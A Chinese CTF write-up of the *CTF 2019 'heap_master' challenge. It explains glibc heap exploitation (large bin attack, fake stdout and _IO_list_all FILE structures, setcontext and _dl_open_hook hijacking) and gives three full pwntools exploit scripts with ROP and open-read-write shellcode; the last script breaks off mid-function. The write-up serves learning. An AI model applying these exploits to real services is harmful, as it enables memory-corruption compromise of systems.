---
title: *CTF heap_master
categories:
- StartCTF 2019
---
# *CTF heap_master
## 前言

需要做下大型比赛的题目，包括0CTF/*CTF/Balsn CTF等比赛的题，这里先从2019年的*CTF开始。这道题主要参考[xiaoxiaorenwu](https://xiaoxiaorenwu.top/2019/07/05/5%E7%A7%8D%E6%96%B9%E6%B3%95%E8%A7%A3heap_master/)的博客，堆的利用确实精彩，这是期末考试前的最后一篇博客(再不复习就要挂了)

## heap_master

### 程序逻辑

程序有仨功能，Malloc/Edit/Free。Malloc分配指定size的块，Edit可以在一块事先分好的随机map处的区域任意编辑，Free释放这块区域内指定位置的chunk。  

### 漏洞利用

使用Edit在map的地址伪造chunk，之后可以释放，分配的size没有限制，可以极大，开始想能用上hitcon那道题map地址同libc地址差值固定，但是没法Edit输入，目测没什么好的利用思路。最后stuck之后查了xxrw和e3pem的博客，花了一天调试，感觉收获了巨多干货。下面从泄露和get shell分别介绍一下。  

### 泄露libc

程序里用printf和puts(仅用write是没办法从stdout泄露的)，我们通过修改文件结构体来泄露。  

#### large bin attack修改stdout

之前红帽的比赛中看到陆晨学长用了这个攻击方式，自己也试了一下，能做到的效果是往任意两个地址里写victim_addr(链表插入中使用到的unsorted bin地址)。一般构造方式如下：
```py
Malloc(0x320)#0
Malloc(0x410)#1
Malloc(0x20)
Malloc(0x420)#3
Malloc(0x20)
Malloc(0x430)#5
Free(0)
Free(1)
Malloc(0x90)# put 0 to ub & 1 to large bin

Free(3)# now put 3 to ub , now 1 still in large bin

Edit(chunk2+0x8,0x3f1)
Edit(chunk2+0x10,0)
Edit(chunk2+0x18,addr1-0x10)
Edit(chunk2+0x20,0)
Edit(chunk2+0x28,addr2-0x20)

Malloc(0x90)#trigger inserting to large bin
```

首先我们确定一下这里的chunk2，其fd、bk、fd_nextsize、bk_nextsize构造出main_arena+n(libc相关)(方法是通过构造两个small bin之后释放，Edit原ub的size复原释放，再部分写bk和bk_nextsize为stdout_addr-0x10和stdout_addr+0x19-0x20错位写write_ptr最低一字节和write_base的7字节)，需要满足的条件是`_flags & 0x1a00 != 0`以及`_IO_write_base != _IO_write_ptr`，因为我们写入的是`victim_addr`，所以只需要满足`victim_addr & 0x1a00 != 0`，我们知道map的地址最低三字节为000，所以a00这个可以通过构造map地址实现，而0x1000这个通过map地址的随机性实现，最终可以成功修改_IO_2_1_stdout，泄露libc地址和map地址。  

#### 伪造文件结构体泄露

通过ub attck修改global_max_fast(同样是部分写small bin的残留libc指针)，使得我们用到的size对应的chunk基本都进fastbin。我们知道main_arena的+8开始存储的是各个size(0x20-0x80)的fastbin的头指针。一旦突破这个限制之后就可以`将main_arena后的地址覆写为map地址`。也就是说我们可以将main_arena后的stdout指针的内容覆写为一个map_addr，进而使得stdout使用map_addr上伪造的文件结构体进行puts和printf。这里的伪造最好先copy一下正常_IO_2_1_stdout_的结构体内容(一直到vtable)。之后部分写里面的内容，最终泄露libc地址和map地址(_IO_write_base和_IO_write_ptr之间的就是泄露的内容，改成stdout地址及其+8即可)。

### get flag/shell

get shell的方法也有很多，非常地精妙，本来我是应该把自己复现过程再搞一遍截图发的，但是期末复习时间实在太紧，就只讲思路了，后面会给参考链接去看大佬们的博客有调试详情。原题是glibc 2.25，开了chroot限制get shell，所以只能orw。  

#### _IO_list_all 

先用large bin attack改_IO_list_all为map地址，伪造map地址为fake file。在调用exit的时候会执行_IO_flush_all_lockp，经过`fflush`获取_IO_FILE_plus调用其中的_IO_str_overflow。

```py
Edit(fake_file+0xd8,_IO_str_jumps)
Edit(fake_file+0xe0,call_func)
```
跟着调试会发现_IO_str_overflow里调用的参数rdi为map_addr，往后看会有一次赋值操作将rdi+0x28的值放入了rdx，我们在map地址把这个值改成`pop rsp;pop r13;ret`的地址，在fake_file+0xe0的位置我们设置其值为`pop rbx ; pop rbp ; jmp rdx`的地址，最后会跳转到pop rsp这里，进而将栈劫持到我们的map地址处。最后构造orw读取flag。

#### _dl_open_hook && setcontext+53

这里有个有趣的知识，是官网wp给的。通过largebin attack将_dl_open_hook覆盖为map_addr，通过malloc或者free报错的方式，程序会把该值加载到寄存器，再call寄存器，在题目的libc下，寄存器为rbx。  
题目的libc还有这样一个gadges:
```asm
0x7FD7D: mov     rdi, [rbx+48h]
         mov     rsi, r13
         call    qword ptr [rbx+40h]
```
我们通过设置rbx+0x48可以设置rdi，设置rbx+0x40可以设置call_func。我们的call_func设置的是`setcontext+53`，有了rdi，可以控制`rdi+0xa8`，即`rcx`，这是最后会调用的函数地址，以及`rdi+0xa0`，这是函数执行完会ret到的地址，所以我们设置参数，调用mprotect修改map地址属性为rwx，ret到map里存shellcode的地方执行orw。

```asm
0x7ffff7a7a565 <setcontext+53>:      mov    rsp,QWORD PTR [rdi+0xa0]
0x7ffff7a7a56c <setcontext+60>:      mov    rbx,QWORD PTR [rdi+0x80]
0x7ffff7a7a573 <setcontext+67>:      mov    rbp,QWORD PTR [rdi+0x78]
0x7ffff7a7a577 <setcontext+71>:      mov    r12,QWORD PTR [rdi+0x48]
0x7ffff7a7a57b <setcontext+75>:      mov    r13,QWORD PTR [rdi+0x50]
0x7ffff7a7a57f <setcontext+79>:      mov    r14,QWORD PTR [rdi+0x58]
0x7ffff7a7a583 <setcontext+83>:      mov    r15,QWORD PTR [rdi+0x60]
0x7ffff7a7a587 <setcontext+87>:      mov    rcx,QWORD PTR [rdi+0xa8]
0x7ffff7a7a58e <setcontext+94>:      push   rcx
0x7ffff7a7a58f <setcontext+95>:      mov    rsi,QWORD PTR [rdi+0x70]
0x7ffff7a7a593 <setcontext+99>:      mov    rdx,QWORD PTR [rdi+0x88]
0x7ffff7a7a59a <setcontext+106>:     mov    rcx,QWORD PTR [rdi+0x98]
0x7ffff7a7a5a1 <setcontext+113>:     mov    r8,QWORD PTR [rdi+0x28]
0x7ffff7a7a5a5 <setcontext+117>:     mov    r9,QWORD PTR [rdi+0x30]
0x7ffff7a7a5a9 <setcontext+121>:     mov    rdi,QWORD PTR [rdi+0x68]
0x7ffff7a7a5ad <setcontext+125>:     xor    eax,eax
0x7ffff7a7a5af <setcontext+127>:     ret
```

#### 利用fastbin放入fastbinY的性质

先拿ub改global_max_fast，之后可以通过计算算出__free_hook这里作为fastbinY应当存的fastbin的size，之后释放一个伪造成这个size的chunk，从而使得__free_hook里放入这个map_addr，再修改map_addr->fd为system，分配得到这个chunk，即可让__free_hook里写入system(原理同fastbin改fd是一样的)。  
除了释放，我们也可以直接largebin attack改_free_hook为victim地址。计算改size，再分配这个chunk，最后是一样的效果。

### _IO_list_all.py

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 2

libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]

def change_ld(binary, ld):
    """
    Force to use assigned new ld.so by changing the binary
    """
    if not os.access(ld, os.R_OK):
        log.failure("Invalid path {} to ld".format(ld))
        return None


    if not isinstance(binary, ELF):
        if not os.access(binary, os.R_OK):
            log.failure("Invalid path {} to binary".format(binary))
            return None
        binary = ELF(binary)


    for segment in binary.segments:
        if segment.header['p_type'] == 'PT_INTERP':
            size = segment.header['p_memsz']
            addr = segment.header['p_paddr']
            data = segment.data()
            if size <= len(ld):
                log.failure("Failed to change PT_INTERP from {} to {}".format(data, ld))
                return None
            binary.write(addr, ld.ljust(size, '\x00'))
            if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn')
            path = '/tmp/pwn/{}_debug'.format(os.path.basename(binary.path))
            if os.access(path, os.F_OK):
                os.remove(path)
                info("Removing exist file {}".format(path))
            binary.save(path)
            os.chmod(path, 0b111000000) #rwx------
    success("PT_INTERP has changed from {} to {}. Using temp file {}".format(data, ld, path))
    return ELF(path)

if debug == 1:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    stdout_addr = 0x2620
    elf = ELF('./heap_master')
    p = process('./heap_master')

elif debug == 2:
    libc = ELF('./libc.so.6')
    stdout_addr = 0x5600
    elf = change_ld("./heap_master",'./ld-linux-x86-64.so.2')
    p = elf.process(env={"LD_PRELOAD":"./libc.so.6"})

def Add(size):
    p.recvuntil('>> ')
    p.sendline('1')
    p.recvuntil("size: ")
    p.sendline(str(size))

def Edit(offset,content):
    p.recvuntil('>> ')
    p.sendline('2')
    p.recvuntil("offset: ")
    p.sendline(str(offset))

    p.recvuntil("size: ")
    p.sendline(str(len(content)))

    p.recvuntil("content: ")
    p.send(content)

def Delete(offset):
    p.recvuntil('>> ')
    p.sendline('3')
    p.recvuntil("offset: ")
    p.sendline(str(offset))

def Exit():
    p.recvuntil('>> ')
    p.sendline('4')

def exp():
    offset = 0x8800-0x7a0
    #leak libc
    Edit(offset+0,p64(0)+p64(0x331))#0
    Edit(offset+0x330,p64(0)+p64(0x31))#1
    Edit(offset+0x330+0x30,p64(0)+p64(0x411))#2
    Edit(offset+0x330+0x30+0x410,p64(0)+p64(0x31))#3
    Edit(offset+0x330+0x30+0x410+0x30,p64(0)+p64(0x411))#4
    Edit(offset+0x330+0x30+0x410+0x30+0x410,p64(0)+p64(0x31))#5
    Edit(offset+0x330+0x30+0x410+0x30+0x410+0x30,p64(0)+p64(0x31))#6

    Delete(offset+0x10)#0
    Delete(offset+0x330+0x30+0x10)#2
    Add(0x90)

    #set two main_arena addr
    Edit(offset+0x330+0x30,p64(0)+p64(0x111)+p64(0)+p64(0x101))
    Edit(offset+0x330+0x30+0x110,p64(0)+p64(0x101))
    Edit(offset+0x330+0x30+0x110+0x100,p64(0)+p64(0x101))


    Delete(offset+0x330+0x30+0x10+0x10)
    Add(0x90)
    Edit(offset+0x330+0x30+0x110,p64(0)+p64(0x101))

    Delete(offset+0x330+0x30+0x10)
    Add(0x90)

    #recover
    #Edit(0x330+0x30,p64(0)+p64(0x411))#2 again

    Edit(offset+0x330+0x30+0x3f0,p64(0x3f0)+p64(0x20)+p64(0)*2+p64(0)+p64(0x31))

    #
    Edit(offset+0x330+0x30+0x8,p64(0x3f1)+p64(0)+p16(stdout_addr-0x10))
    Edit(offset+0x330+0x30+0x18+0x8,p64(0)+p16(stdout_addr+0x19-0x20))
    Delete(offset+0x330+0x30+0x410+0x30+0x10)#4


    Add(0x90)
    if debug == 1:
        p.recvn(0x18)
        libc_base = u64(p.recv(8)) - (0x7ffff7dd06e0 - 0x7ffff7a0d000)
        #map
        map_addr = u64(p.recv(8)) - (0xc13b1800-0xc13a9000)
    else:
        map_addr = u64(p.recv(8))
        libc_base = u64(p.recv(8)) - (0x7ffff7dd5683-0x7ffff7a37000)

    log.success("libc base => " + hex(libc_base))
    log.success("map addr => " + hex(map_addr))
    #get shell
    offset = 0
    Edit(offset+0,p64(0)+p64(0x331))#0
    Edit(offset+0x330,p64(0)+p64(0x31))#1
    Edit(offset+0x330+0x30,p64(0)+p64(0x511))#2
    Edit(offset+0x330+0x30+0x510,p64(0)+p64(0x31))#3
    Edit(offset+0x330+0x30+0x510+0x30,p64(0)+p64(0x511))#4
    Edit(offset+0x330+0x30+0x510+0x30+0x510,p64(0)+p64(0x31))#5
    Edit(offset+0x330+0x30+0x510+0x30+0x510+0x30,p64(0)+p64(0x31))#6
    libc.address =  libc_base
    io_list_all = libc.sym['_IO_list_all']

    Delete(offset+0x10)#0
    Delete(offset+0x330+0x30+0x10)#2
    Add(0x90)

    Delete(offset+0x330+0x30+0x510+0x30+0x10)#4

    Edit(offset+0x330+0x30,p64(0)+p64(0x3f1)+p64(0)+p64(io_list_all-0x10)+p64(0)+p64(io_list_all-0x20))
    Edit(offset+0x330+0x30+0x3f0,p64(0)+p64(0x21)+p64(0)*2+p64(0)+p64(0x21))
    io_heap_addr = map_addr + offset + 0x8a0



    Add(0x90)

    #

    if debug == 1:
        _IO_str_jumps = libc_base + (0x7ffff7dd07a0-0x7ffff7a0d000)
        p_rsp = libc_base + 0x0000000000003838
        p_rsp_r13 = libc_base + 0x00000000000206c3
        p_rbx_rbp_jrdx = libc_base + 0x000000000012d751


        p_rdi = libc_base + 0x0000000000021102
        p_rdx_rsi = libc_base + 0x00000000001150c9
        p_rax = libc_base + 0x0000000000033544
        syscall = libc_base + 0x00000000000bc375
    elif debug == 2:
        _IO_str_jumps = libc_base + 0x39A500
        p_rsp = libc_base + 0x0000000000003870
        p_rsp_r13 = libc_base + 0x000000000001fd94
        p_rbx_rbp_jrdx = libc_base + 0x0000000000111271

        p_rdi = libc_base + 0x000000000001feea
        p_rdx_rsi = libc_base + 0x00000000000f9619
        p_rax = libc_base + 0x0000000000036d98
        syscall = libc_base + 0x00000000000aa6b5

    #
    fake_file = p64(0) + p64(p_rsp) + p64(map_addr+8) + p64(0) + p64(0) + p64(p_rsp_r13)

    Edit(offset+0x8a0,fake_file)
    Edit(offset+0x8a0+0xd8,p64(_IO_str_jumps))
    Edit(offset+0x8a0+0xe0,p64(p_rbx_rbp_jrdx))
    orw = [
            p_rdi,map_addr,
            p_rdx_rsi,0,0,
            p_rax,2,
            syscall,
            p_rdi,3,
            p_rdx_rsi,0x30,map_addr+0x200,
            p_rax,0,
            syscall,
            p_rdi,1,
            p_rdx_rsi,0x30,map_addr+0x200,
            p_rax,1,
            syscall
    ]
    if debug == 1:
        Edit(0,'./flag\x00\x00'+flat(orw))
    else:
        Edit(0x8800,'./flag\x00\x00'+flat(orw))

    #gdb.attach(p,'b *_IO_str_overflow')
    #/libio/
    Exit()


    p.interactive()

exp()
```

### _dl_open_hook_setcontext.py

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 2

libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]

def change_ld(binary, ld):
    """
    Force to use assigned new ld.so by changing the binary
    """
    if not os.access(ld, os.R_OK):
        log.failure("Invalid path {} to ld".format(ld))
        return None


    if not isinstance(binary, ELF):
        if not os.access(binary, os.R_OK):
            log.failure("Invalid path {} to binary".format(binary))
            return None
        binary = ELF(binary)


    for segment in binary.segments:
        if segment.header['p_type'] == 'PT_INTERP':
            size = segment.header['p_memsz']
            addr = segment.header['p_paddr']
            data = segment.data()
            if size <= len(ld):
                log.failure("Failed to change PT_INTERP from {} to {}".format(data, ld))
                return None
            binary.write(addr, ld.ljust(size, '\x00'))
            if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn')
            path = '/tmp/pwn/{}_debug'.format(os.path.basename(binary.path))
            if os.access(path, os.F_OK):
                os.remove(path)
                info("Removing exist file {}".format(path))
            binary.save(path)
            os.chmod(path, 0b111000000) #rwx------
    success("PT_INTERP has changed from {} to {}. Using temp file {}".format(data, ld, path))
    return ELF(path)

if debug == 1:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    stdout_addr = 0x2620
    elf = ELF('./heap_master')
    p = process('./heap_master')

elif debug == 2:
    libc = ELF('./libc.so.6')
    stdout_addr = 0x5600
    elf = change_ld("./heap_master",'./ld-linux-x86-64.so.2')
    p = elf.process(env={"LD_PRELOAD":"./libc.so.6"})

def Add(size):
    p.recvuntil('>> ')
    p.sendline('1')
    p.recvuntil("size: ")
    p.sendline(str(size))

def Edit(offset,content):
    p.recvuntil('>> ')
    p.sendline('2')
    p.recvuntil("offset: ")
    p.sendline(str(offset))

    p.recvuntil("size: ")
    p.sendline(str(len(content)))

    p.recvuntil("content: ")
    p.send(content)

def Delete(offset):
    p.recvuntil('>> ')
    p.sendline('3')
    p.recvuntil("offset: ")
    p.sendline(str(offset))

def Exit():
    p.recvuntil('>> ')
    p.sendline('4')

def exp():
    offset = 0x8800-0x7a0
    #leak libc
    Edit(offset+0,p64(0)+p64(0x331))#0
    Edit(offset+0x330,p64(0)+p64(0x31))#1
    Edit(offset+0x330+0x30,p64(0)+p64(0x411))#2
    Edit(offset+0x330+0x30+0x410,p64(0)+p64(0x31))#3
    Edit(offset+0x330+0x30+0x410+0x30,p64(0)+p64(0x411))#4
    Edit(offset+0x330+0x30+0x410+0x30+0x410,p64(0)+p64(0x31))#5
    Edit(offset+0x330+0x30+0x410+0x30+0x410+0x30,p64(0)+p64(0x31))#6

    Delete(offset+0x10)#0
    Delete(offset+0x330+0x30+0x10)#2
    Add(0x90)

    #set two main_arena addr
    Edit(offset+0x330+0x30,p64(0)+p64(0x111)+p64(0)+p64(0x101))
    Edit(offset+0x330+0x30+0x110,p64(0)+p64(0x101))
    Edit(offset+0x330+0x30+0x110+0x100,p64(0)+p64(0x101))


    Delete(offset+0x330+0x30+0x10+0x10)
    Add(0x90)
    Edit(offset+0x330+0x30+0x110,p64(0)+p64(0x101))

    Delete(offset+0x330+0x30+0x10)
    Add(0x90)

    #recover
    #Edit(0x330+0x30,p64(0)+p64(0x411))#2 again

    Edit(offset+0x330+0x30+0x3f0,p64(0x3f0)+p64(0x20)+p64(0)*2+p64(0)+p64(0x31))

    #
    Edit(offset+0x330+0x30+0x8,p64(0x3f1)+p64(0)+p16(stdout_addr-0x10))
    Edit(offset+0x330+0x30+0x18+0x8,p64(0)+p16(stdout_addr+0x19-0x20))
    Delete(offset+0x330+0x30+0x410+0x30+0x10)#4


    Add(0x90)
    if debug == 1:
        p.recvn(0x18)
        libc_base = u64(p.recv(8)) - (0x7ffff7dd06e0 - 0x7ffff7a0d000)
        #map
        map_addr = u64(p.recv(8)) - (0xc13b1800-0xc13a9000)
    else:
        map_addr = u64(p.recv(8)) - 0x8800
        libc_base = u64(p.recv(8)) - (0x7ffff7dd5683-0x7ffff7a37000)

    log.success("libc base => " + hex(libc_base))
    log.success("map addr => " + hex(map_addr))
    #get shell
    offset = 0
    Edit(offset+0,p64(0)+p64(0x331))#0
    Edit(offset+0x330,p64(0)+p64(0x31))#1
    Edit(offset+0x330+0x30,p64(0)+p64(0x511))#2
    Edit(offset+0x330+0x30+0x510,p64(0)+p64(0x31))#3
    Edit(offset+0x330+0x30+0x510+0x30,p64(0)+p64(0x511))#4
    Edit(offset+0x330+0x30+0x510+0x30+0x510,p64(0)+p64(0x31))#5
    Edit(offset+0x330+0x30+0x510+0x30+0x510+0x30,p64(0)+p64(0x31))#6
    libc.address =  libc_base
    _dl_open_hook = libc_base + (0x7ffff7dd92e0-0x7ffff7a37000)

    Delete(offset+0x10)#0
    Delete(offset+0x330+0x30+0x10)#2

    Add(0x90)
    #
    mov_rdi_call_rbx = libc_base + 0x7fd7d

    Delete(offset+0x330+0x30+0x510+0x30+0x10)#4
    Edit(offset+0x330+0x30,p64(0)+p64(0x3f1)+p64(0)+p64(_dl_open_hook-0x10)+p64(0)+p64(_dl_open_hook-0x20))
    Edit(offset+0x330+0x30+0x3f0,p64(0)+p64(0x21)+p64(0)*2+p64(0)+p64(0x21))
    Add(0x90)
    gdb.attach(p,'b *setcontext+53')
    Edit(offset+0x8a0,p64(mov_rdi_call_rbx))
    Edit(offset+0x8a0+0x40,p64(libc.sym['setcontext']+53)+p64(map_addr+0x200))
    #
    p_rsp = libc_base + 0x0000000000003870
    Edit(offset+0x200+0x68,p64(map_addr))
    Edit(offset+0x200+0x70,p64(0x10000))
    Edit(offset+0x200+0x88,p64(7))
    Edit(offset+0x200+0xa0,p64(map_addr+offset+0x200)+p64(libc.sym['mprotect']))
    #sc
    sc = asm('mov rdi,'+str(map_addr+offset))
    sc += asm('''
            xor rsi,rsi
            xor rdx,rdx
            mov rax,2
            syscall
            mov rdi,rax
            ''')
    sc += asm('mov rsi,'+str(map_addr+0x300))
    sc += asm('''
            mov rdx,48
            mov rax,0
            syscall
            mov rdi,1
            mov rax,1
            syscall
            ''')
    Edit(offset,'./flag\x00')
    Edit(offset+0x1f8,'./flag\x00\x00'+p64(map_addr+0x208)+sc)
    #offset+0x8900
    Delete(111)

    p.interactive()

exp()
```

### leak_by_ub_attack.py

这里泄露之后本想结束的，后来看xxrw里介绍了另一种orw的方法，利用__morecore，这个函数在main_arena+2024+0xa8处，它是用来平衡栈平衡的。我们用IO_list_all伪造文件结构体，调用_IO_str_overflow设置调用的rdi和调用函数，最后去调用setcontext(main_arena+2024)，在
*(rdi+0xa0)利用之前的fastbinY的利用设置为rop_chain地址，在*(rdi+0xa8)设置为刚才的morecore，最后成功跳到rop_chain。

```asm
0x7f09c5962308 <main_arena+2024>:	0x00007f09c59622f8	0x00007f09c59622f8
0x7f09c5962318 <main_arena+2040>:	0x00007f09c5962308	0x00007f09c5962308
0x7f09c5962328 <main_arena+2056>:	0x00007f09c5962318	0x00007f09c5962318
0x7f09c5962338 <main_arena+2072>:	0x00007f09c5962328	0x00007f09c5962328
0x7f09c5962348 <main_arena+2088>:	0x00007f09c5962338	0x00007f09c5962338
0x7f09c5962358 <main_arena+2104>:	0x00007f09c5962348	0x00007f09c5962348
0x7f09c5962368 <main_arena+2120>:	0x00007f09c5962358	0x00007f09c5962358
0x7f09c5962378 <main_arena+2136>:	0x0000000000000000	0x0000000000000000
0x7f09c5962388 <main_arena+2152>:	0x00007f09c5961b20	0x0000000000000000
0x7f09c5962398 <main_arena+2168>:	0x0000000000000001	0x0000000000021000
0x7f09c59623a8 <main_arena+2184>:	0x000000008b2f3000	0x00007f09c56248c0

0x7f09c56248c0 <__GI___default_morecore>:	sub    rsp,0x8
0x7f09c56248c4 <__GI___default_morecore+4>:	call   0x7f09c5699e80 <__GI___sbrk>
0x7f09c56248c9 <__GI___default_morecore+9>:	mov    edx,0x0
0x7f09c56248ce <__GI___default_morecore+14>:	cmp    rax,0xffffffffffffffff
0x7f09c56248d2 <__GI___default_morecore+18>:	cmove  rax,rdx
0x7f09c56248d6 <__GI___default_morecore+22>:	add    rsp,0x8
0x7f09c56248da <__GI___default_morecore+26>:	ret
```

伪造文件结构体绕过

```
1. fp->_flags & _IO_NO_WRITES为假
2. fp->_flags & _IO_USER_BUF(0x01)为假
3. 2*(fp->_IO_buf_end - fp->_IO_buf_base) + 100 不能为负数
4. new_size = 2 * (fp->_IO_buf_end - fp->_IO_buf_base) + 100; 这里是劫持到的函数的rdi，即第一参数
5. fp+0xe0指向需要劫持到的函数
```

伪造的文件结构体

```
    _IO_FILE = ( p64(0) +
                 p64(0)*3 +
                 p64(0) +                     # write_base
                 p64(0x7fffffffffffffff) +    # write_ptr
                 p64(0xdadaddaaddddaaaa) +
                 p64(0) +                     # buf_base
                 p64((morecore - 100) / 2) +  #  rdi   buf_end
                 p64(0xdadaddaaddddaaaa)*11 +
                 p64(0) + # + 0xa8
                 p64(0xdadaddaaddddaaaa)*6 +
                 p64(IO_str_j) +          # + 0xd8
                 p64(setcontext))
```

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1

libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]

def change_ld(binary, ld):
    """
    Force to use assigned new ld.so by changing the binary
    """
    if not os.access(ld, os.R_OK):
        log.failure("Invalid path {} to ld".format(ld))
        return None


    if not isinstance(binary, ELF):
        if not os.access(binary, os.R_OK):
            log.failure("Invalid path {} to binary".format(binary))
            return None
        binary = ELF(binary)


    for segment in binary.segments:
        if segment.header['p_type'] == 'PT_INTERP':
            size = segment.header['p_memsz']
            addr = segment.header['p_paddr']
            data = segment.data()
            if size <= len(ld):
                log.failure("Failed to change PT_INTERP from {} to {}".format(data, ld))
                return None
            binary.write(addr, ld.ljust(size, '\x00'))
            if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn')
            path = '/tmp/pwn/{}_debug'.format(os.path.basename(binary.path))
            if os.access(path, os.F_OK):
                os.remove(path)
                info("Removing exist file {}".format(path))
            binary.save(path)
            os.chmod(path, 0b111000000) #rwx------
    success("PT_INTERP has changed from {} to {}. Using temp file {}".format(data, ld, path))
    return ELF(path)

if debug == 1:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    stdout_addr = 0x2620
    elf = ELF('./heap_master')
    p = process('./heap_master')

elif debug == 2:
    libc = ELF('./libc.so.6')
    stdout_addr = 0x5600
    elf = change_ld("./heap_master",'./ld-linux-x86-64.so.2')
    p = elf.process(env={"LD_PRELOAD":"./libc.so.6"})

def Add(size):
    p.recvuntil('>> ')
    p.sendline('1')
    p.recvuntil("size: ")
    p.sendline(str(size))

def Edit(offset,content):
    p.recvuntil('>> ')
    p.sendline('2')
    p.recvuntil("offset: ")
    p.sendline(str(offset))

    p.recvuntil("size: ")
    p.sendline(str(len(content)))

    p.recvuntil("content: ")
    p.send(content)

def Delete(offset):
    p.recvuntil('>> ')
    p.sendline('3')
    p.recvuntil("offset: ")
    p.sendline(str(offset))

def Exit():
    p.recvuntil('>> ')
    p.sendline('4')

def exp():
    if debug == 1:
        global_max_fast = 0x37f8
    #ub attack
    Edit(0,p64(0)+p64(0x91))
    Edit(0x90,p64(0)+p64(0x21))
    Edit(0x90+0x20,p64(0)+p64(0x21))

    Edit(0x90+0x20+0x20,p64(0)+p64(0x17e1))
    Edit(0x90+0x20+0x20+0x17e0,p64(0)+p64(0x21))
    Edit(0x90+0x20+0x20+0x17e0+0x20,p64(0)+p64(0xf1))
    Edit(0x90+0x20+0x20+0x17e0+0x20+0xf0,p64(0)+p64(0x21))
    Edit(0x90+0x20+0x20+0x17e0+0x20+0xf0+0x20,p64(0)+p64(0x21))
    Edit(0x90+0x20+0x20,p64(0xfbad1800))

    #
    Edit(0x90+0x20+0x20+0x40,p64(0)+p64(0x91))
    Edit(0x90+0x20+0x20+0x40+0x90,p64(0)+p64(0x21)+p64(0)*3+p64(0x21))
    Delete(0x90+0x20+0x20+0x40+0x10)
    Add(0x90)
    last_two = 0x26a3

    #
    Edit(0x90+0x20+0x20+0x30,p64(0)+p64(0xa1))
    Edit(0x90+0x20+0x20+0x30+0xa0,p64(0)+p64(0x21)+p64(0)*3+p64(0x21))

    Delete(0x90+0x20+0x20+0x30+0x10)
    Add(0xa0)

    #
    Edit(0x90+0x20+0x20+0x20,p64(0)+p64(0xb1))
    Edit(0x90+0x20+0x20+0x20+0xb0,p64(0)+p64(0x21)+p64(0)*2+p64(0)+p64(0x21))
    Delete(0x90+0x20+0x20+0x20+0x10)


    Add(0xb0)
    #
    Edit(0x90+0x20+0x20+0x10,p64(0)+p64(0xc1))
    Edit(0x90+0x20+0x20+0x10+0xc0,p64(0)+p64(0x21)+p64(0)*2+p64(0)+p64(0x21))

    Delete(0x90+0x20+0x20+0x10+0x10)

    Add(0xc0)

    Edit(0x90+0x20+0x20+0x40+0x10,p16(last_two))
    Edit(0x90+0x20+0x20+0x40+0x18,p16(last_two))


    Edit(0x90+0x20+0x20+0x30+0x10,p16(last_two))
    Edit(0x90+0x20+0x20+0x30+0x18,p16(last_two))


    Edit(0x90+0x20+0x20+0x20+0x10,p16(last_two))
    Edit(0x90+0x20+0x20+0x20+0x18,p16(last_two))


    Edit(0x90+0x20+0x20+0x10+0x10,p16(last_two))
    Edit(0x90+0x20+0x20+0x10+0x18,p16(last_two))



    #prepare
    Edit(0x90+0x20+0x20+0x80,p64(0)+p64(0x101))
    Edit(0x90+0x20+0x20+0x80+0x100,p64(0)+p64(0x21))
    Edit(0x90+0x20+0x20+0x80+0x100+0x20,p64(0)+p64(0x21))

    Delete(0x90+0x20+0x20+0x80+0x10)

    Add(0x100)
    Edit(0x90+0x20+0x20+0x80+0x10,p64(0xa000000)+p16(0x3780))
    #
    Edit(0x90+0x20+0x20+0x70,p64(0)+p64(0x111))
    Edit(0x90+0x20+0x20+0x70+0x110,p64(0)+p64(0x21))
    Edit(0x90+0x20+0x20+0x70+0x110+0x20,p64(0)+p64(0x21))


    Delete(0x90+0x20+0x20+0x70+0x10)
    Add(0x110)
    #fake vtable
    Edit(0x190,p64(0)+p64(0x121))
    Edit(0x190+0x120,p64(0)+p64(0x21))
    Edit(0x190+0x120+0x20,p64(0)+p64(0x21))
    Delete(0x190+0x10)
    Add(0x120)

    #change global max fast


    Delete(0x90+0x20+0x20+0x17e0+0x20+0x10)

    Edit(0x90+0x20+0x20+0x17e0+0x20+0x10+8,p16(global_max_fast-0x10))

    Add(0xe0)
    ###
    Edit(0x100,'\x00')

    Edit(0x118,p64(0)*4+p16(0x18e0))
    Edit(0x140,p64(1)+p64(0xffffffffffffffff)+p64(0xa000000)+p16(0x3780))
    Edit(0x160,p64(0xffffffffffffffff)+p64(0))
    Edit(0x1a8,p16(0x6e0))

    Delete(0x90+0x20+0x20+0x10)

    Edit(0xf0,'\x00')

    #
    p.recvn(0x18)
    libc_base = u64(p.recv(8)) - (0x7ffff7dd06e0-0x7ffff7a0d000)
    log.success("libc base => " + hex(libc_base))
    #
    Edit(0xf0,p64(libc_base+0x3c5708)+p64(libc_base+0x3c5710))

    map_addr = u64(p.recv(8)) - 0xd0
    log.success("map addr => " + hex(map_addr))

    #same way to overwrite IO_list_all to mmap_addr

    offset = 0x200
    Edit(offset+8,p64(0x1411))

    Edit(offset+0x1410+8,p64(0x21))
    Edit(offset+0x1410+0x20+8,p64(0x21))



    Delete(offset+0x10)#IO_list_all
    #hajack map addr to
    IO_str_j = libc_base + libc.sym['_IO_file_jumps']+0xc0
    morecore = libc_base + libc.sym['__morecore'] - 8 - 0xa0
    setcontext = libc_base + libc.sym['setcontext']+53
    _IO_FILE = ( p64(0) +
		     p64(0)*3 +
		     p64(0) +                     # write_base
		     p64(0x7fffffffffffffff) +    # write_ptr
		     p64(0xdadaddaaddddaaaa) +
		     p64(0) +                     # buf_base
		     p64((morecore - 100) / 2) +  #  rdi   buf_end
		     p64(0xdadaddaaddddaaaa)*11 +
		     p64(0) + # + 0xa8
		     p64(0xdadaddaaddddaaaa)*6 +
		     p64(IO_str_j) +          # + 0xd8
		     p64(setcontext))
    Edit(offset,_IO_FILE)
    offset = 0x600


